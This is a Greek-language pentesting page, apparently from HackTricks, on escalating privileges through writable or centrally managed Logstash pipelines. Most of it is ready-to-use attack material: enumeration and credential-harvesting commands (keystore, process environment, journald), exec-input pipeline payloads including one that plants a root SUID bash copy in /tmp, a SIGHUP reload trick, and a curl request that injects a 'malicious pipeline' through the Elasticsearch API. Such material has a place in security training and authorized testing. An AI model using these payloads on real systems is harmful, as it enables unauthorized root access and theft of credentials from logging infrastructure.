# Κλιμάκωση Προνομίων Logstash

## Logstash

Το Logstash χρησιμοποιείται για **συλλογή, μετασχηματισμό και αποστολή logs** μέσω ενός συστήματος γνωστού ως **pipelines**. Αυτά τα pipelines αποτελούνται από στάδια **input**, **filter** και **output**.<sup>[[4]](#references)</sup> Μια ενδιαφέρουσα πτυχή προκύπτει όταν το Logstash λειτουργεί σε ένα compromised machine.

### Διαμόρφωση Pipeline

Σε εγκαταστάσεις πακέτων Debian και RPM, τα pipelines διαμορφώνονται μέσω του **/etc/logstash/pipelines.yml**, το οποίο παραθέτει τις τοποθεσίες των διαμορφώσεων των pipelines· άλλες distributions τοποθετούν το `pipelines.yml` στον κατάλογο `path.settings` του Logstash.<sup>[[5]](#references)[[6]](#references)</sup>
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Αυτό το αρχείο αποκαλύπτει πού βρίσκονται τα αρχεία **.conf** που περιέχουν pipeline configurations. Όταν χρησιμοποιείται **Elasticsearch output**, ελέγξτε τις ρυθμίσεις `user`/`password`, `cloud_auth` ή `api_key`· τα effective privileges του account εξαρτώνται από το Elasticsearch. Ένα glob στο `path.config` φορτώνει κάθε αρχείο που ταιριάζει για το συγκεκριμένο pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Αν το Logstash εκκινηθεί με `-f <directory>` αντί για `pipelines.yml`, το `-f` έχει προτεραιότητα και **όλα τα αρχεία μέσα σε αυτόν τον κατάλογο συνενώνονται με λεξικογραφική σειρά και αναλύονται ως ένα ενιαίο config**.<sup>[[6]](#references)[[7]](#references)</sup> Αυτό δημιουργεί 2 offensive implications:

- Ένα αρχείο που προστέθηκε, όπως `000-input.conf` ή `zzz-output.conf`, μπορεί να αλλάξει τον τρόπο με τον οποίο συναρμολογείται το τελικό pipeline
- Ένα malformed αρχείο μπορεί να προκαλέσει αποτυχία validation στο συνενωμένο config· κατά το reload, το Logstash διατηρεί το προηγούμενο pipeline, επομένως κάντε validate τα payloads πριν βασιστείτε στο auto-reload.<sup>[[1]](#references)</sup>

### Γρήγορη Enumeration σε Compromised Host

Σε ένα host όπου είναι εγκατεστημένο το Logstash, ελέγξτε γρήγορα:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Ελέγξτε επίσης αν το local monitoring API είναι προσβάσιμο. Από προεπιλογή, κάνει bind στο **127.0.0.1:9600**, κάτι που συνήθως είναι αρκετό μετά το landing στον host.<sup>[[8]](#references)</sup>
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Αυτά τα endpoints εκθέτουν pipeline IDs και settings, runtime metrics και counters επιτυχίας/αποτυχίας του config-reload, βοηθώντας στην επιβεβαίωση του αν μια αλλαγή έγινε αποδεκτή.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Αν ένα recovered credential στοχεύει το **Elasticsearch**, ελέγξτε [αυτήν την άλλη σελίδα σχετικά με το Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation μέσω Writable Pipelines

Για να επιχειρήσετε privilege escalation, εντοπίστε πρώτα τον χρήστη υπό τον οποίο εκτελείται στην πραγματικότητα η υπηρεσία Logstash· μην υποθέσετε ότι είναι ο root ή ο χρήστης **logstash**. Βεβαιωθείτε ότι πληροίτε **ένα** από τα εξής κριτήρια:

- Διαθέτετε **write access** σε ένα pipeline **.conf** file **ή**
- Το **/etc/logstash/pipelines.yml** file χρησιμοποιεί wildcard και μπορείτε να κάνετε write στον φάκελο-στόχο.<sup>[[6]](#references)[[7]](#references)</sup>

Επιπλέον, πρέπει να πληρούται **μία** από τις εξής συνθήκες:

- Έχετε τη δυνατότητα να κάνετε restart την υπηρεσία Logstash **ή**
- Το **/etc/logstash/logstash.yml** file έχει ορισμένο το **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Όταν υπάρχει wildcard στο configuration, η δημιουργία ενός file που ταιριάζει με αυτό το wildcard επιτρέπει command execution.<sup>[[7]](#references)[[9]](#references)</sup> Για παράδειγμα:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Εδώ, το **interval** καθορίζει τη συχνότητα εκτέλεσης σε δευτερόλεπτα. Στο συγκεκριμένο παράδειγμα, η εντολή **whoami** εκτελείται κάθε 120 δευτερόλεπτα και η έξοδός της κατευθύνεται στο **/tmp/output.log**.<sup>[[9]](#references)</sup>

Με την επιλογή **config.reload.automatic: true** στο **/etc/logstash/logstash.yml**, το Logstash εντοπίζει και εφαρμόζει αυτόματα νέες ή τροποποιημένες ρυθμίσεις pipeline χωρίς να απαιτείται επανεκκίνηση.<sup>[[1]](#references)[[15]](#references)</sup> Αν δεν υπάρχει wildcard, μπορούν και πάλι να γίνουν τροποποιήσεις στις υπάρχουσες ρυθμίσεις, αλλά συνιστάται προσοχή για την αποφυγή διακοπών.

### Πιο αξιόπιστα Pipeline Payloads

Το plugin εισόδου `exec` εξακολουθεί να λειτουργεί στις τρέχουσες εκδόσεις και απαιτεί είτε ένα `interval` είτε ένα `schedule`. Εκτελείται κάνοντας **forking** του Logstash JVM, επομένως, αν η μνήμη είναι περιορισμένη, το payload μπορεί να αποτύχει με `ENOMEM` αντί να εκτελεστεί σιωπηλά.<sup>[[9]](#references)</sup>

Όταν η υπηρεσία διαθέτει επαρκή δικαιώματα για τη δημιουργία ενός αρχείου SUID που ανήκει στον root, ένα πρακτικό privilege-escalation payload είναι εκείνο που αφήνει ένα ανθεκτικό artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Αν δεν έχετε δικαιώματα επανεκκίνησης αλλά μπορείτε να στείλετε σήμα στη διεργασία, το Logstash υποστηρίζει επίσης επαναφόρτωση που ενεργοποιείται μέσω **SIGHUP** σε συστήματα τύπου Unix:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Να έχετε υπόψη ότι δεν είναι κάθε plugin συμβατό με reload. Για παράδειγμα, το input **stdin** αποτρέπει το automatic reload, επομένως μην θεωρείτε δεδομένο ότι το `config.reload.automatic` θα εφαρμόζει πάντα τις αλλαγές σας.<sup>[[1]](#references)</sup>

### Κλοπή Secrets από το Logstash

Πριν εστιάσετε αποκλειστικά στο code execution, συλλέξτε τα δεδομένα στα οποία έχει ήδη πρόσβαση το Logstash:

- Credentials μπορεί να εμφανίζονται σε outputs `elasticsearch {}`, σε URLs/ρυθμίσεις του `http_poller`, σε JDBC inputs ή σε ρυθμίσεις που σχετίζονται με cloud· αυτά τα plugins εκθέτουν πεδία credentials που αξίζει να αναζητήσετε.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings μπορεί να βρίσκονται στο **`/etc/logstash/logstash.keystore`** ή σε άλλον κατάλογο `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Ο κωδικός πρόσβασης του keystore μπορεί να παρέχεται μέσω του **`LOGSTASH_KEYSTORE_PASS`**, ενώ οι εγκαταστάσεις RPM/DEB φορτώνουν τις μεταβλητές περιβάλλοντος της υπηρεσίας από το **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Η επέκταση μεταβλητών περιβάλλοντος με `${VAR}` επιλύεται κατά την εκκίνηση του Logstash, επομένως αξίζει να ελέγξετε το περιβάλλον της υπηρεσίας.<sup>[[14]](#references)</sup>

Χρήσιμοι έλεγχοι:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Αυτό αξίζει επίσης να ελεγχθεί, επειδή το **CVE-2023-46672** έδειξε ότι, υπό συγκεκριμένες συνθήκες, το Logstash κατέγραφε ευαίσθητες πληροφορίες στα logs του, συμπεριλαμβανομένων secrets αποθηκευμένων στο keystore και αναφερόμενων από τη διαμόρφωση· ελέγξτε τα παλιά logs του Logstash και τις καταχωρίσεις του `journald`, εάν ενδέχεται να ισχύουν αυτές οι συνθήκες.<sup>[[3]](#references)</sup>

### Κατάχρηση Κεντρized Pipeline Management

Σε ορισμένα περιβάλλοντα, ο host **δεν** βασίζεται καθόλου σε τοπικά αρχεία `.conf`. Εάν έχει ρυθμιστεί το **`xpack.management.enabled: true`**, το Logstash μπορεί να ανακτά centrally managed pipelines από το Elasticsearch/Kibana και, μετά την ενεργοποίηση αυτής της λειτουργίας, οι τοπικές pipeline configs δεν αποτελούν πλέον την source of truth.<sup>[[2]](#references)</sup>

Αυτό σημαίνει ότι υπάρχει διαφορετικό attack path:

1. Ανακτήστε Elastic credentials από τις τοπικές ρυθμίσεις του Logstash, το keystore ή τα logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Επαληθεύστε εάν ο λογαριασμός διαθέτει το **`manage_logstash_pipelines`** cluster privilege.<sup>[[16]](#references)</sup>
3. Δημιουργήστε ή αντικαταστήστε ένα centrally managed pipeline, ώστε ο host του Logstash να εκτελέσει το payload σας στο επόμενο poll interval.<sup>[[2]](#references)[[16]](#references)</sup>

Το Elasticsearch API που χρησιμοποιείται για αυτήν τη λειτουργία είναι:<sup>[[16]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"last_modified": "2026-01-02T02:50:51.250Z",
"username": "user",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {
"pipeline.workers": 1,
"pipeline.batch.size": 1,
"pipeline.batch.delay": 50,
"queue.type": "memory",
"queue.max_bytes": "1gb",
"queue.checkpoint.writes": 1024
}
}'
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν τα local αρχεία είναι μόνο για ανάγνωση, αλλά το Logstash είναι ήδη καταχωρισμένο για την ανάκτηση pipelines απομακρυσμένα.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Επαναφόρτωση του αρχείου ρυθμίσεων](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Ρύθμιση κεντρικής διαχείρισης pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Ενημέρωση ασφαλείας Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Δημιουργία Logstash Pipeline](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Διάταξη καταλόγων Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Πολλαπλά Pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Εκτέλεση του Logstash από τη γραμμή εντολών](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Παρακολούθηση του Logstash με APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Secrets keystore για ασφαλείς ρυθμίσεις](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Χρήση μεταβλητών περιβάλλοντος](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Δημιουργία ή ενημέρωση Logstash pipeline](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Λήψη ρυθμίσεων για pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Λήψη στατιστικών για pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
